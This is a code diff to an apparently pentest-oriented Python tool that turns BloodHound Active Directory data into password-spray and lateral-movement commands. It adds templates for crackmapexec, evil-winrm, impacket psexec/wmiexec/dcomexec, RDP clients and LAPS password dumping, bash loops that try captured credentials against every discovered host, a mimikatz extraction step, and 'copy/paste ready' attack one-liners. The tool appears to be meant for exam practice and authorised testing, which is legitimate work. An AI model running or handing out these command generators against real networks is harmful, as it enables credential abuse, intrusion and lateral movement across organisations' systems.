@@ -1969,6 +1969,7 @@ def print_spray_recommendations(
     dc_ip: str = "<DC_IP>",
     use_colors: bool = True,
     method_filter: str = "all",
+    all_ips: List[str] = None,
 ) -> None:
     """
     Print password spray recommendations based on captured credentials and policy.
@@ -1979,6 +1980,7 @@ def print_spray_recommendations(
     - Scenario-based recommendations
     - User enumeration commands
     - Technique comparison table
+    - ALL TARGETS section with multi-protocol loops (SMB, WinRM, RDP, MSSQL)
 
     Args:
         pwned_users: List of PwnedUser objects with credentials
@@ -1987,11 +1989,13 @@ def print_spray_recommendations(
         dc_ip: Domain Controller IP
         use_colors: Enable ANSI colors
         method_filter: Filter to specific method (smb, kerberos, ldap, all)
+        all_ips: List of resolved IPs from Neo4j for multi-target loops
     """
     from .command_mappings import (
         SPRAY_TECHNIQUES,
         SPRAY_SCENARIOS,
         USER_ENUM_COMMANDS,
+        SPRAY_ONELINERS,
     )
 
     c = Colors if use_colors else _NoColors
@@ -2121,6 +2125,20 @@ def print_spray_recommendations(
         print(f"    {c.RED}- {ldap.disadvantages}{c.RESET}")
 
     # =========================================================================
+    # ALL TARGETS - Multi-Protocol Credential Validation Loops
+    # =========================================================================
+    if method_filter == "all" and all_ips is not None:
+        first_pwd = passwords[0] if passwords else "<PASSWORD>"
+        first_user = usernames[0] if usernames else "<USERNAME>"
+        _print_all_targets_section(
+            all_ips=all_ips,
+            password=first_pwd,
+            username=first_user,
+            domain=domain,
+            c=c,
+        )
+
+    # =========================================================================
     # USER ENUMERATION COMMANDS
     # =========================================================================
     if method_filter == "all":
@@ -2179,6 +2197,26 @@ def print_spray_recommendations(
         _print_spray_comparison_table(c)
 
     # =========================================================================
+    # SPRAY ONE-LINERS
+    # =========================================================================
+    print()
+    print(f"  {c.YELLOW}{c.BOLD}SPRAY ONE-LINERS{c.RESET}")
+    print(f"  {c.DIM}{'-'*70}{c.RESET}")
+    print(f"  {c.DIM}Complete attack workflows - copy/paste ready{c.RESET}")
+    print()
+
+    first_pwd = passwords[0] if passwords else "<PASSWORD>"
+    for i, oneliner in enumerate(SPRAY_ONELINERS, 1):
+        name = oneliner["name"]
+        desc = oneliner["description"]
+        cmd = fill_template(oneliner["cmd"], first_pwd)
+
+        print(f"  {c.BOLD}{i}. {name}{c.RESET}")
+        print(f"     {c.DIM}{desc}{c.RESET}")
+        print(f"     {c.GREEN}{cmd}{c.RESET}")
+        print()
+
+    # =========================================================================
     # EXAM TIP
     # =========================================================================
     print()
@@ -2235,6 +2273,103 @@ def _print_spray_comparison_table(c) -> None:
     print(f"  {c.DIM}+{'-'*w_method}+{'-'*w_noise}+{'-'*w_speed}+{'-'*w_admin}+{c.RESET}")
 
 
+def _print_all_targets_section(
+    all_ips: List[str],
+    password: str,
+    username: str,
+    domain: str,
+    c,  # Colors class
+) -> None:
+    """
+    Print credential validation loops for all discovered hosts.
+
+    Shows bash loops for SMB, WinRM, RDP, and MSSQL protocols.
+    Uses inline IPs for <=20 hosts, file-based input for >20.
+
+    Args:
+        all_ips: List of resolved IP addresses from Neo4j
+        password: Password to test (from captured creds)
+        username: Username to test (for single-user commands)
+        domain: Domain name for authentication
+        c: Colors class for output formatting
+    """
+    from .command_mappings import ALL_TARGETS_PROTOCOLS, ALL_TARGETS_IP_THRESHOLD
+
+    if not all_ips:
+        print()
+        print(f"  {c.YELLOW}{c.BOLD}ALL TARGETS - Credential Validation{c.RESET}")
+        print(f"  {c.DIM}{'-'*70}{c.RESET}")
+        print(f"  {c.RED}No resolved IPs in BloodHound data.{c.RESET}")
+        print(f"  {c.DIM}Run: crack bloodtrail --refresh-ips to resolve hostnames{c.RESET}")
+        return
+
+    ip_count = len(all_ips)
+    use_file = ip_count > ALL_TARGETS_IP_THRESHOLD
+
+    print()
+    print(f"  {c.CYAN}{c.BOLD}ALL TARGETS - Credential Validation Loops{c.RESET}")
+    print(f"  {c.DIM}Test where captured creds can authenticate across the network{c.RESET}")
+    print(f"  {c.DIM}{ip_count} hosts with resolved IPs from BloodHound data{c.RESET}")
+    print(f"  {c.DIM}{'-'*70}{c.RESET}")
+
+    # Escape password for shell
+    safe_password = password.replace("'", "'\"'\"'") if password else "<PASSWORD>"
+    safe_username = username if username else "<USERNAME>"
+    domain_lower = domain.lower() if domain else "<DOMAIN>"
+
+    if use_file:
+        # File-based format for many IPs
+        print()
+        print(f"  {c.YELLOW}# First, create targets file:{c.RESET}")
+        # Show first few and last few IPs
+        print(f"  {c.GREEN}cat << 'EOF' > targets.txt{c.RESET}")
+        for ip in all_ips[:5]:
+            print(f"  {c.GREEN}{ip}{c.RESET}")
+        if ip_count > 10:
+            print(f"  {c.DIM}... ({ip_count - 10} more IPs) ...{c.RESET}")
+        for ip in all_ips[-5:]:
+            print(f"  {c.GREEN}{ip}{c.RESET}")
+        print(f"  {c.GREEN}EOF{c.RESET}")
+
+        print()
+        for proto, config in ALL_TARGETS_PROTOCOLS.items():
+            port = config["port"]
+            desc = config["description"]
+            template = config["file_template"]
+
+            cmd = template.format(
+                targets_file="targets.txt",
+                user_file="users.txt",
+                username=safe_username,
+                password=safe_password,
+                domain=domain_lower,
+            )
+
+            print(f"  {c.BOLD}# {proto.upper()} (port {port}){c.RESET} {c.DIM}- {desc}{c.RESET}")
+            print(f"  {c.GREEN}{cmd}{c.RESET}")
+            print()
+    else:
+        # Inline IP format for fewer hosts
+        ips_inline = " ".join(all_ips)
+
+        for proto, config in ALL_TARGETS_PROTOCOLS.items():
+            port = config["port"]
+            desc = config["description"]
+            template = config["loop_template"]
+
+            cmd = template.format(
+                ips=ips_inline,
+                user_file="users.txt",
+                username=safe_username,
+                password=safe_password,
+                domain=domain_lower,
+            )
+
+            print()
+            print(f"  {c.BOLD}# {proto.upper()} (port {port}){c.RESET} {c.DIM}- {desc}{c.RESET}")
+            print(f"  {c.GREEN}{cmd}{c.RESET}")
+
+
 # =============================================================================
 # PASSWORD SPRAY SECTION (for run_all_queries report integration)
 # =============================================================================
@@ -2267,6 +2402,9 @@ def generate_spray_section(
         SPRAY_TECHNIQUES,
         SPRAY_SCENARIOS,
         USER_ENUM_COMMANDS,
+        PASSWORD_LIST_COMMANDS,
+        PASSWORD_LIST_SCENARIOS,
+        SPRAY_ONELINERS,
     )
 
     c = Colors if use_colors else _NoColors
@@ -2488,6 +2626,76 @@ def generate_spray_section(
             markdown_lines.append("")
 
     # =========================================================================
+    # PASSWORD LIST GENERATION COMMANDS
+    # =========================================================================
+    console_lines.append("")
+    console_lines.append(f"  {c.YELLOW}{c.BOLD}PASSWORD LIST GENERATION{c.RESET}")
+    console_lines.append(f"  {c.DIM}{'-'*70}{c.RESET}")
+
+    markdown_lines.append("### Password List Generation")
+    markdown_lines.append("")
+
+    pwd_linux_cmds = PASSWORD_LIST_COMMANDS.get("linux", {})
+    pwd_windows_cmds = PASSWORD_LIST_COMMANDS.get("windows", {})
+
+    console_lines.append("")
+    console_lines.append(f"  {c.BOLD}From Linux (Kali):{c.RESET}")
+
+    markdown_lines.append("**From Linux (Kali):**")
+    markdown_lines.append("")
+
+    for key in ["bloodhound_passwords", "bloodhound_user_pass", "hashcat_potfile", "john_potfile", "cewl_wordlist", "mutation_rules"]:
+        if key in pwd_linux_cmds:
+            cmd = pwd_linux_cmds[key]
+            filled = fill_template(cmd["cmd"], first_pwd)
+            console_lines.append(f"    {c.DIM}# {cmd['description']}{c.RESET}")
+            console_lines.append(f"    {c.GREEN}{filled}{c.RESET}")
+            console_lines.append("")
+
+            markdown_lines.append(f"```bash")
+            markdown_lines.append(f"# {cmd['description']}")
+            markdown_lines.append(filled)
+            markdown_lines.append("```")
+            markdown_lines.append("")
+
+    console_lines.append(f"  {c.BOLD}From Windows (on target):{c.RESET}")
+    markdown_lines.append("**From Windows (on target):**")
+    markdown_lines.append("")
+
+    for key in ["mimikatz_extract"]:
+        if key in pwd_windows_cmds:
+            cmd = pwd_windows_cmds[key]
+            console_lines.append(f"    {c.DIM}# {cmd['description']}{c.RESET}")
+            console_lines.append(f"    {c.GREEN}{cmd['cmd']}{c.RESET}")
+            console_lines.append("")
+
+            markdown_lines.append(f"```powershell")
+            markdown_lines.append(f"# {cmd['description']}")
+            markdown_lines.append(cmd['cmd'])
+            markdown_lines.append("```")
+            markdown_lines.append("")
+
+    # Password list scenario recommendations table
+    console_lines.append("")
+    console_lines.append(f"  {c.CYAN}Password List Scenarios:{c.RESET}")
+    console_lines.append(f"  {'Scenario':<40} {'Method':<22} {'Reason'}")
+    console_lines.append(f"  {'-'*40} {'-'*22} {'-'*35}")
+
+    markdown_lines.append("**Password List Scenarios:**")
+    markdown_lines.append("")
+    markdown_lines.append("| Scenario | Method | Reason |")
+    markdown_lines.append("|----------|--------|--------|")
+
+    for scenario in PASSWORD_LIST_SCENARIOS:
+        s = scenario["scenario"][:38]
+        m = scenario["method"]
+        r = scenario["reason"][:33]
+        console_lines.append(f"  {s:<40} {c.BOLD}{m:<22}{c.RESET} {c.DIM}{r}{c.RESET}")
+        markdown_lines.append(f"| {scenario['scenario']} | **{m}** | {scenario['reason']} |")
+
+    markdown_lines.append("")
+
+    # =========================================================================
     # SCENARIO RECOMMENDATIONS
     # =========================================================================
     console_lines.append("")
@@ -2564,6 +2772,41 @@ def generate_spray_section(
     markdown_lines.append("")
 
     # =========================================================================
+    # SPRAY ONE-LINERS
+    # =========================================================================
+    console_lines.append("")
+    console_lines.append(f"  {c.YELLOW}{c.BOLD}SPRAY ONE-LINERS{c.RESET}")
+    console_lines.append(f"  {c.DIM}{'-'*70}{c.RESET}")
+    console_lines.append(f"  {c.DIM}Complete attack workflows - copy/paste ready{c.RESET}")
+    console_lines.append("")
+
+    markdown_lines.append("### Spray One-Liners")
+    markdown_lines.append("")
+    markdown_lines.append("Complete attack workflows - copy/paste ready:")
+    markdown_lines.append("")
+
+    for i, oneliner in enumerate(SPRAY_ONELINERS, 1):
+        name = oneliner["name"]
+        desc = oneliner["description"]
+        cmd = fill_template(oneliner["cmd"], first_pwd)
+
+        # Console output
+        console_lines.append(f"  {c.BOLD}{i}. {name}{c.RESET}")
+        console_lines.append(f"     {c.DIM}{desc}{c.RESET}")
+        console_lines.append(f"     {c.GREEN}{cmd}{c.RESET}")
+        console_lines.append("")
+
+        # Markdown output
+        markdown_lines.append(f"**{i}. {name}**")
+        markdown_lines.append(f"")
+        markdown_lines.append(f"_{desc}_")
+        markdown_lines.append("")
+        markdown_lines.append("```bash")
+        markdown_lines.append(cmd)
+        markdown_lines.append("```")
+        markdown_lines.append("")
+
+    # =========================================================================
     # EXAM TIP
     # =========================================================================
     console_lines.append("")
@@ -2579,6 +2822,385 @@ def generate_spray_section(
 
     markdown_lines.append(f"> **EXAM TIP:** Before spraying, always check `net accounts` to verify lockout.")
     markdown_lines.append(f"> With {threshold}-attempt lockout, safely attempt {safe} passwords per {window} min window.")
+    markdown_lines.append("")
+
+    return "\n".join(console_lines), "\n".join(markdown_lines)
+
+
+# =============================================================================
+# TAILORED SPRAY COMMANDS (Based on BloodHound Access Data)
+# =============================================================================
+
+# Protocol mapping for each access type
+ACCESS_TYPE_PROTOCOLS = {
+    "AdminTo": {
+        "name": "Local Admin",
+        "protocols": [
+            {"name": "SMB (CrackMapExec)", "cmd": "crackmapexec smb {targets} -u {users} -p '<PASSWORD>'", "single": "crackmapexec smb {target} -u {user} -p '<PASSWORD>'"},
+            {"name": "WinRM (evil-winrm)", "cmd": "evil-winrm -i {target} -u {user} -p '<PASSWORD>'", "single": "evil-winrm -i {target} -u {user} -p '<PASSWORD>'"},
+            {"name": "PSExec", "cmd": "impacket-psexec '{domain}/{user}:<PASSWORD>'@{target}", "single": "impacket-psexec '{domain}/{user}:<PASSWORD>'@{target}"},
+            {"name": "WMIExec", "cmd": "impacket-wmiexec '{domain}/{user}:<PASSWORD>'@{target}", "single": "impacket-wmiexec '{domain}/{user}:<PASSWORD>'@{target}"},
+        ],
+    },
+    "CanRDP": {
+        "name": "RDP Access",
+        "protocols": [
+            {"name": "xfreerdp", "cmd": "xfreerdp /v:{target} /u:{user} /p:'<PASSWORD>' /cert:ignore", "single": "xfreerdp /v:{target} /u:{user} /p:'<PASSWORD>' /cert:ignore"},
+            {"name": "rdesktop", "cmd": "rdesktop -u {user} -p '<PASSWORD>' {target}", "single": "rdesktop -u {user} -p '<PASSWORD>' {target}"},
+        ],
+    },
+    "CanPSRemote": {
+        "name": "PS Remoting",
+        "protocols": [
+            {"name": "WinRM (evil-winrm)", "cmd": "evil-winrm -i {target} -u {user} -p '<PASSWORD>'", "single": "evil-winrm -i {target} -u {user} -p '<PASSWORD>'"},
+            {"name": "WinRM (CrackMapExec)", "cmd": "crackmapexec winrm {targets} -u {users} -p '<PASSWORD>'", "single": "crackmapexec winrm {target} -u {user} -p '<PASSWORD>'"},
+        ],
+    },
+    "ExecuteDCOM": {
+        "name": "DCOM Execution",
+        "protocols": [
+            {"name": "DCOMExec", "cmd": "impacket-dcomexec '{domain}/{user}:<PASSWORD>'@{target}", "single": "impacket-dcomexec '{domain}/{user}:<PASSWORD>'@{target}"},
+        ],
+    },
+    "ReadLAPSPassword": {
+        "name": "LAPS Password",
+        "protocols": [
+            {"name": "LDAP Query", "cmd": "crackmapexec ldap {target} -u {user} -p '<PASSWORD>' -M laps", "single": "crackmapexec ldap {target} -u {user} -p '<PASSWORD>' -M laps"},
+            {"name": "LAPSDumper", "cmd": "python3 laps.py -u {user} -p '<PASSWORD>' -d {domain}", "single": "python3 laps.py -u {user} -p '<PASSWORD>' -d {domain}"},
+        ],
+    },
+}
+
+
+def _extract_username(upn: str) -> str:
+    """Extract username from UPN format (USER@DOMAIN.COM -> user)."""
+    if "@" in upn:
+        return upn.split("@")[0].lower()
+    return upn.lower()
+
+
+def _extract_domain(upn: str) -> str:
+    """Extract domain from UPN format (USER@DOMAIN.COM -> DOMAIN.COM)."""
+    if "@" in upn:
+        return upn.split("@")[1]
+    return ""
+
+
+def _group_by_common_targets(user_targets: dict, access_type: str) -> list:
+    """
+    Group users by common target subsets.
+
+    Args:
+        user_targets: {username: set(targets)} for a specific access type
+        access_type: The access type being processed
+
+    Returns:
+        List of groups: [{users: [u1, u2], targets: [t1, t2], target_ips: {t1: ip1}}]
+    """
+    if not user_targets:
+        return []
+
+    groups = []
+
+    # Convert to list for iteration
+    users = list(user_targets.keys())
+    target_sets = {u: set(t for t, ip in targets) for u, targets in user_targets.items()}
+    ip_mapping = {}
+    for u, targets in user_targets.items():
+        for t, ip in targets:
+            if ip:
+                ip_mapping[t] = ip
+
+    # Find unique target set combinations and group users
+    processed_target_sets = {}
+
+    for user in users:
+        targets_frozen = frozenset(target_sets[user])
+        if targets_frozen not in processed_target_sets:
+            processed_target_sets[targets_frozen] = []
+        processed_target_sets[targets_frozen].append(user)
+
+    # Convert to group list
+    for targets_frozen, group_users in processed_target_sets.items():
+        targets_list = sorted(list(targets_frozen))
+        target_ips = {t: ip_mapping.get(t) for t in targets_list}
+        groups.append({
+            "users": sorted(group_users),
+            "targets": targets_list,
+            "target_ips": target_ips,
+        })
+
+    # Now find subset relationships for additional grouping
+    # Sort by target set size (largest first)
+    groups.sort(key=lambda g: (-len(g["targets"]), -len(g["users"])))
+
+    return groups
+
+
+def print_spray_tailored(
+    access_data: list,
+    domain: str = "",
+    use_colors: bool = True,
+) -> tuple:
+    """
+    Print tailored spray commands based on BloodHound access data.
+
+    Groups users by identical machine access patterns to reduce redundancy.
+    Shows both file-based and inline bash loop formats.
+    NO TRUNCATION - prints everything.
+
+    Args:
+        access_data: List from get_all_users_with_access()
+        domain: Domain name for command templates
+        use_colors: Enable ANSI colors
+
+    Returns:
+        Tuple of (console_output, markdown_output)
+    """
+    c = Colors if use_colors else _NoColors
+
+    console_lines = []
+    markdown_lines = []
+
+    # Build user -> {access_type -> set((target, ip))} mapping
+    user_access = {}
+    for entry in access_data:
+        user = entry["user"]
+        computer = entry["computer"]
+        access_type = entry["access_type"]
+        ip = entry.get("ip")
+
+        if user not in user_access:
+            user_access[user] = {}
+        if access_type not in user_access[user]:
+            user_access[user][access_type] = set()
+        user_access[user][access_type].add((computer, ip))
+
+    # Count statistics
+    unique_users = len(user_access)
+    unique_computers = len(set(e["computer"] for e in access_data))
+    access_types_found = set(e["access_type"] for e in access_data)
+
+    # =========================================================================
+    # HEADER
+    # =========================================================================
+    console_lines.append("")
+    console_lines.append(f"{c.CYAN}{c.BOLD}{'='*78}{c.RESET}")
+    console_lines.append(f"  {c.BOLD}TAILORED SPRAY COMMANDS{c.RESET}")
+    console_lines.append(f"  {c.DIM}Based on BloodHound access relationships{c.RESET}")
+    console_lines.append(f"{c.CYAN}{'='*78}{c.RESET}")
+
+    markdown_lines.append("# Tailored Spray Commands")
+    markdown_lines.append("")
+    markdown_lines.append("Based on BloodHound access relationships - targeted commands for known valid access.")
+    markdown_lines.append("")
+
+    # =========================================================================
+    # SUMMARY STATISTICS
+    # =========================================================================
+    console_lines.append("")
+    console_lines.append(f"  {c.YELLOW}{c.BOLD}SUMMARY{c.RESET}")
+    console_lines.append(f"  {c.DIM}{'-'*70}{c.RESET}")
+    console_lines.append(f"    Users with access:    {c.BOLD}{unique_users}{c.RESET}")
+    console_lines.append(f"    Target machines:      {c.BOLD}{unique_computers}{c.RESET}")
+    console_lines.append(f"    Access types found:   {c.BOLD}{', '.join(sorted(access_types_found))}{c.RESET}")
+
+    markdown_lines.append("## Summary")
+    markdown_lines.append("")
+    markdown_lines.append(f"- **Users with access:** {unique_users}")
+    markdown_lines.append(f"- **Target machines:** {unique_computers}")
+    markdown_lines.append(f"- **Access types:** {', '.join(sorted(access_types_found))}")
+    markdown_lines.append("")
+
+    if not access_data:
+        console_lines.append("")
+        console_lines.append(f"  {c.YELLOW}No user-to-machine access relationships found.{c.RESET}")
+        markdown_lines.append("*No user-to-machine access relationships found.*")
+        return "\n".join(console_lines), "\n".join(markdown_lines)
+
+    # =========================================================================
+    # GROUP BY ACCESS TYPE
+    # =========================================================================
+    for access_type in ["AdminTo", "CanRDP", "CanPSRemote", "ExecuteDCOM", "ReadLAPSPassword"]:
+        if access_type not in access_types_found:
+            continue
+
+        protocol_info = ACCESS_TYPE_PROTOCOLS.get(access_type, {})
+        access_name = protocol_info.get("name", access_type)
+        protocols = protocol_info.get("protocols", [])
+
+        # Build user_targets for this access type
+        user_targets = {}
+        for user, access_dict in user_access.items():
+            if access_type in access_dict:
+                user_targets[_extract_username(user)] = access_dict[access_type]
+
+        if not user_targets:
+            continue
+
+        groups = _group_by_common_targets(user_targets, access_type)
+
+        console_lines.append("")
+        console_lines.append(f"  {c.CYAN}{c.BOLD}{'='*74}{c.RESET}")
+        console_lines.append(f"  {c.BOLD}{access_name.upper()} ({access_type}){c.RESET}")
+        console_lines.append(f"  {c.DIM}{len(user_targets)} users, {len(groups)} unique target groups{c.RESET}")
+        console_lines.append(f"  {c.CYAN}{'='*74}{c.RESET}")
+
+        markdown_lines.append(f"## {access_name} ({access_type})")
+        markdown_lines.append("")
+        markdown_lines.append(f"{len(user_targets)} users, {len(groups)} unique target groups")
+        markdown_lines.append("")
+
+        # =====================================================================
+        # EACH GROUP
+        # =====================================================================
+        for group_idx, group in enumerate(groups, 1):
+            users = group["users"]
+            targets = group["targets"]
+            target_ips = group["target_ips"]
+
+            # Get IPs (prefer resolved IPs, fallback to hostname)
+            ips_or_hosts = []
+            for t in targets:
+                ip = target_ips.get(t)
+                if ip:
+                    ips_or_hosts.append(ip)
+                else:
+                    # Use hostname without domain if no IP
+                    hostname = t.split(".")[0] if "." in t else t
+                    ips_or_hosts.append(hostname)
+
+            console_lines.append("")
+            console_lines.append(f"  {c.YELLOW}{c.BOLD}Group {group_idx}: {len(users)} user(s) → {len(targets)} target(s){c.RESET}")
+            console_lines.append(f"  {c.DIM}Users: {', '.join(users)}{c.RESET}")
+
+            markdown_lines.append(f"### Group {group_idx}: {len(users)} user(s) → {len(targets)} target(s)")
+            markdown_lines.append("")
+            markdown_lines.append(f"**Users:** `{', '.join(users)}`")
+            markdown_lines.append("")
+
+            # Show targets with IPs
+            console_lines.append(f"  {c.DIM}Targets:{c.RESET}")
+            markdown_lines.append("**Targets:**")
+            markdown_lines.append("")
+            for t in targets:
+                ip = target_ips.get(t)
+                if ip:
+                    console_lines.append(f"    - {t} ({ip})")
+                    markdown_lines.append(f"- `{t}` ({ip})")
+                else:
+                    console_lines.append(f"    - {t}")
+                    markdown_lines.append(f"- `{t}`")
+            markdown_lines.append("")
+
+            # =================================================================
+            # FILE-BASED COMMANDS
+            # =================================================================
+            console_lines.append("")
+            console_lines.append(f"  {c.BOLD}File-based commands:{c.RESET}")
+            markdown_lines.append("#### File-based commands")
+            markdown_lines.append("")
+
+            users_str = "\\n".join(users)
+            targets_str = "\\n".join(ips_or_hosts)
+
+            console_lines.append(f"    {c.GREEN}# Create user and target files{c.RESET}")
+            console_lines.append(f"    {c.GREEN}echo -e \"{users_str}\" > users_g{group_idx}.txt{c.RESET}")
+            console_lines.append(f"    {c.GREEN}echo -e \"{targets_str}\" > targets_g{group_idx}.txt{c.RESET}")
+
+            markdown_lines.append("```bash")
+            markdown_lines.append("# Create user and target files")
+            markdown_lines.append(f'echo -e "{users_str}" > users_g{group_idx}.txt')
+            markdown_lines.append(f'echo -e "{targets_str}" > targets_g{group_idx}.txt')
+
+            # Show first protocol command with file-based input
+            if protocols:
+                proto = protocols[0]
+                cmd = proto["cmd"]
+                # Replace file-based placeholders
+                cmd = cmd.replace("{targets}", f"targets_g{group_idx}.txt")
+                cmd = cmd.replace("{users}", f"users_g{group_idx}.txt")
+                # Also replace single placeholders for commands that don't support file input
+                cmd = cmd.replace("{target}", f"targets_g{group_idx}.txt")
+                cmd = cmd.replace("{user}", f"users_g{group_idx}.txt")
+                cmd = cmd.replace("{domain}", domain.split(".")[0] if domain else "<DOMAIN>")
+                console_lines.append(f"    {c.GREEN}{cmd}{c.RESET}")
+                markdown_lines.append(cmd)
+
+            markdown_lines.append("```")
+            markdown_lines.append("")
+
+            # =================================================================
+            # INLINE BASH LOOP
+            # =================================================================
+            console_lines.append("")
+            console_lines.append(f"  {c.BOLD}Inline bash loop:{c.RESET}")
+            markdown_lines.append("#### Inline bash loop")
+            markdown_lines.append("")
+
+            users_inline = " ".join(users)
+            targets_inline = " ".join(ips_or_hosts)
+
+            if protocols:
+                proto = protocols[0]
+                single_cmd = proto.get("single", proto["cmd"])
+                single_cmd = single_cmd.replace("{domain}", domain.split(".")[0] if domain else "<DOMAIN>")
+
+                loop = f"for user in {users_inline}; do\n  for target in {targets_inline}; do\n    {single_cmd.replace('{user}', '$user').replace('{target}', '$target')}\n  done\ndone"
+
+                console_lines.append(f"    {c.GREEN}for user in {users_inline}; do{c.RESET}")
+                console_lines.append(f"    {c.GREEN}  for target in {targets_inline}; do{c.RESET}")
+                console_lines.append(f"    {c.GREEN}    {single_cmd.replace('{user}', '$user').replace('{target}', '$target')}{c.RESET}")
+                console_lines.append(f"    {c.GREEN}  done{c.RESET}")
+                console_lines.append(f"    {c.GREEN}done{c.RESET}")
+
+                markdown_lines.append("```bash")
+                markdown_lines.append(f"for user in {users_inline}; do")
+                markdown_lines.append(f"  for target in {targets_inline}; do")
+                markdown_lines.append(f"    {single_cmd.replace('{user}', '$user').replace('{target}', '$target')}")
+                markdown_lines.append("  done")
+                markdown_lines.append("done")
+                markdown_lines.append("```")
+                markdown_lines.append("")
+
+            # =================================================================
+            # ALL PROTOCOL OPTIONS
+            # =================================================================
+            if len(protocols) > 1:
+                console_lines.append("")
+                console_lines.append(f"  {c.DIM}Alternative protocols:{c.RESET}")
+                markdown_lines.append("**Alternative protocols:**")
+                markdown_lines.append("")
+
+                for proto in protocols[1:]:
+                    single_cmd = proto.get("single", proto["cmd"])
+                    single_cmd = single_cmd.replace("{domain}", domain.split(".")[0] if domain else "<DOMAIN>")
+                    single_cmd = single_cmd.replace("{user}", users[0])
+                    single_cmd = single_cmd.replace("{target}", ips_or_hosts[0] if ips_or_hosts else "<TARGET>")
+
+                    console_lines.append(f"    {c.DIM}# {proto['name']}{c.RESET}")
+                    console_lines.append(f"    {c.GREEN}{single_cmd}{c.RESET}")
+
+                    markdown_lines.append(f"```bash")
+                    markdown_lines.append(f"# {proto['name']}")
+                    markdown_lines.append(single_cmd)
+                    markdown_lines.append("```")
+                    markdown_lines.append("")
+
+    # =========================================================================
+    # FOOTER
+    # =========================================================================
+    console_lines.append("")
+    console_lines.append(f"{c.CYAN}{'='*78}{c.RESET}")
+    console_lines.append(f"  {c.YELLOW}{c.BOLD}NOTE:{c.RESET} Replace '<PASSWORD>' with actual credentials.")
+    console_lines.append(f"  {c.DIM}Commands are based on BloodHound data - verify access before exploitation.{c.RESET}")
+    console_lines.append(f"{c.CYAN}{'='*78}{c.RESET}")
+    console_lines.append("")
+
+    markdown_lines.append("---")
+    markdown_lines.append("")
+    markdown_lines.append("> **NOTE:** Replace `<PASSWORD>` with actual credentials.")
+    markdown_lines.append("> Commands are based on BloodHound data - verify access before exploitation.")
     markdown_lines.append("")
 
     return "\n".join(console_lines), "\n".join(markdown_lines)
